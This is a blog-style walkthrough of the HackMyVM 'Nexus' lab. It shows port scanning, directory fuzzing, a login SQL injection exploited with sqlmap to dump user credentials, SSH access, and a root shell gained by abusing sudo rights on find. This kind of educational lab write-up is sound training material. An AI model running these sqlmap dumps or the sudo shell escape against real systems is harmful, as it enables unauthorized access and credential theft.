---
layout: post
title: "HackMyVM - Nexus"
# date: 2025-06-28 10:00:00 +0700
categories: [hackmyvm]
tags: [ctf, web exploit, sqli, linux]
image: /assets/images/Nexus-HackMyVM/image.png
---
# Nexus

![image.png](assets/images/Nexus-HackMyVM/image.png)

## Enumeration
### Port Scanning
Starting with an nmap scan to identify open ports and services:

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.62 ((Debian))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:0A:A3:14 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see two open ports:
- **Port 22**: SSH service running OpenSSH 9.2p1
- **Port 80**: HTTP service running Apache 2.4.62

### Web Enumeration
Next, let's perform directory and file fuzzing to discover hidden content:

```bash
ffuf -c -w `fzf-wordlists` -u "http://$TARGET/FUZZ" -mc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.1.17/FUZZ
 :: Wordlist         : FUZZ: /opt/lists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

index.html              [Status: 200, Size: 825, Words: 124, Lines: 48, Duration: 1ms]
login.php               [Status: 200, Size: 352, Words: 61, Lines: 27, Duration: 11ms]
index2.php              [Status: 200, Size: 75134, Words: 30596, Lines: 1642, Duration: 14ms]
.                       [Status: 200, Size: 825, Words: 124, Lines: 48, Duration: 0ms] 
```

The fuzzing reveals several interesting files:
- `index.html` - Main page
- `login.php` - Login page
- `index2.php` - Another page with substantial content

![image.png](assets/images/Nexus-HackMyVM/image%201.png)

## Initial Access
### SQL Injection Discovery
Upon exploring the web application, we discover an additional authentication endpoint at `/auth-login.php`:

![image.png](assets/images/Nexus-HackMyVM/image%202.png)

Let's test for SQL injection vulnerabilities by attempting a basic bypass:

![image.png](assets/images/Nexus-HackMyVM/image%203.png)

Great! The login form is vulnerable to SQL injection. Now let's automate the exploitation process using sqlmap.

### Automated SQL Injection with sqlmap
First, we need to capture the login request using Burp Suite:

![image.png](assets/images/Nexus-HackMyVM/image%204.png)

1. Intercept the POST request during login attempt
2. Right-click and select "Copy to file"

![image.png](assets/images/Nexus-HackMyVM/image%205.png)

Save the request to a file (I'll name it `login.req`):

![image.png](assets/images/Nexus-HackMyVM/image%206.png)

Now we can use sqlmap to exploit the SQL injection vulnerability:

```bash
sqlmap -r login.req --batch
```

![image.png](assets/images/Nexus-HackMyVM/image%207.png)

### Database Enumeration
Let's enumerate the available databases:

```bash
sqlmap -r login.req --batch --dbs 

[14:26:25] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[14:26:25] [INFO] fetching database names
[14:26:25] [INFO] retrieved: 'information_schema'
[14:26:25] [INFO] retrieved: 'sion'
[14:26:25] [INFO] retrieved: 'mysql'
[14:26:25] [INFO] retrieved: 'performance_schema'
[14:26:25] [INFO] retrieved: 'Nebuchadnezzar'
[14:26:25] [INFO] retrieved: 'sys'
available databases [6]:
[*] information_schema
[*] mysql
[*] Nebuchadnezzar
[*] performance_schema
[*] sion
[*] sys
```

### Credential Extraction
The `sion` database looks interesting. Let's dump the user credentials:

```bash
sqlmap -r login.req --batch -D sion -T users --dump
```

![image.png](assets/images/Nexus-HackMyVM/image%208.png)

Perfect! We've successfully extracted user credentials. Now let's attempt SSH login:

![image.png](assets/images/Nexus-HackMyVM/image%209.png)

Excellent! We now have SSH access to the system with the user `shelly`.

## Privilege Escalation
### Sudo Permissions Analysis
Let's check what commands the current user can run with sudo privileges:

```bash
sudo -l
```

We can see that `shelly` has permission to run the `find` command with sudo privileges. This is a classic privilege escalation vector.

### GTFObins Research
According to [GTFObins](https://gtfobins.github.io/gtfobins/find/#sudo), the `find` command can be abused to spawn a shell:

![image.png](assets/images/Nexus-HackMyVM/image%2010.png)

### Root Shell Exploitation
Let's execute the privilege escalation command:

```bash
sudo find . -exec /bin/sh \; -quit
```

![image.png](assets/images/Nexus-HackMyVM/image%2011.png)

Success! We've successfully escalated privileges to root:

![image.png](assets/images/Nexus-HackMyVM/image%2012.png)

## Summary
This was my first lab from [HackMyVM](https://hackmyvm.eu/), and it provided a great introduction to:

1. **Web Application Testing**: Directory/file fuzzing and SQL injection identification
2. **SQL Injection Exploitation**: Using sqlmap for automated database enumeration and credential extraction
3. **Privilege Escalation**: Leveraging sudo permissions and GTFObins for root access

The attack path was straightforward but educational:
- Port scanning → Web enumeration → SQL injection → Credential extraction → SSH access → Sudo abuse → Root shell

This machine serves as an excellent starting point for beginners learning about web application security and basic Linux privilege escalation techniques.
